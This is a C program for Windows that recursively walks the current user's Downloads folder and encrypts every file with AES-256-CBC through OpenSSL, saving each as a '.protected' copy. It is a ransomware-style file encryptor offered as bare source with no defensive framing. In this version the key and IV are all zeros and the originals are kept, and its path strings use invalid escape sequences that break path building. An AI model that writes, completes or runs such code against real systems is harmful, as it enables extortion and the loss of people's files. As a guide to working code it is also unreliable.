#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <sys/stat.h>
#include <windows.h>

#define AES_KEY_LENGTH 256
#define AES_BLOCK_SIZE 16

int aes_encrypt(const unsigned char *plaintext, int plaintext_len, const unsigned char *key,
                const unsigned char *iv, unsigned char *ciphertext) {
    EVP_CIPHER_CTX *ctx;
    int len;
    int ciphertext_len;

    if (!(ctx = EVP_CIPHER_CTX_new())) {
        perror("EVP_CIPHER_CTX_new");
        return -1;
    }

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv) != 1) {
        perror("EVP_EncryptInit_ex");
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }

    if (EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len) != 1) {
        perror("EVP_EncryptUpdate");
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }
    ciphertext_len = len;

    if (EVP_EncryptFinal_ex(ctx, ciphertext + len, &len) != 1) {
        perror("EVP_EncryptFinal_ex");
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }
    ciphertext_len += len;

    EVP_CIPHER_CTX_free(ctx);
    return ciphertext_len;
}

void encrypt_file(const char *filepath, const unsigned char *key, const unsigned char *iv) {
    FILE *file = fopen(filepath, "rb");
    if (!file) {
        perror("fopen");
        return;
    }

    fseek(file, 0, SEEK_END);
    long filesize = ftell(file);
    rewind(file);

    unsigned char *plaintext = malloc(filesize);
    if (!plaintext) {
        perror("malloc");
        fclose(file);
        return;
    }

    fread(plaintext, 1, filesize, file);
    fclose(file);

    unsigned char *ciphertext = malloc(filesize + AES_BLOCK_SIZE);
    if (!ciphertext) {
        perror("malloc");
        free(plaintext);
        return;
    }

    int ciphertext_len = aes_encrypt(plaintext, filesize, key, iv, ciphertext);

    free(plaintext);

    if (ciphertext_len > 0) {
        char protected_filepath[MAX_PATH];
        snprintf(protected_filepath, sizeof(protected_filepath), "%s.protected", filepath);

        file = fopen(protected_filepath, "wb");
        if (!file) {
            perror("fopen");
            free(ciphertext);
            return;
        }
        fwrite(ciphertext, 1, ciphertext_len, file);
        fclose(file);
        free(ciphertext);

        printf("Encrypted: %s\n", protected_filepath);
    } else {
        free(ciphertext);
        printf("Failed to encrypt: %s\n", filepath);
    }
}

void process_directory(const char *directory, const unsigned char *key, const unsigned char *iv) {
    struct dirent *entry;
    DIR *dp = opendir(directory);

    if (!dp) {
        perror("opendir");
        return;
    }

    char filepath[MAX_PATH];
    while ((entry = readdir(dp)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
            continue;
        }

        snprintf(filepath, sizeof(filepath), "%s\%s", directory, entry->d_name);

        struct stat statbuf;
        if (stat(filepath, &statbuf) == 0) {
            if (S_ISREG(statbuf.st_mode)) {
                encrypt_file(filepath, key, iv);
            } else if (S_ISDIR(statbuf.st_mode)) {
                process_directory(filepath, key, iv);
            }
        }
    }

    closedir(dp);
}

int main() {
    char *userprofile = getenv("USERPROFILE");
    if (!userprofile) {
        fprintf(stderr, "USERPROFILE environment variable not found\n");
        return EXIT_FAILURE;
    }

    char downloads_dir[MAX_PATH];
    snprintf(downloads_dir, sizeof(downloads_dir), "%s\Downloads", userprofile);

    unsigned char key[AES_KEY_LENGTH / 8] = {0};
    unsigned char iv[AES_BLOCK_SIZE] = {0};

    process_directory(downloads_dir, key, iv);

    return EXIT_SUCCESS;
}
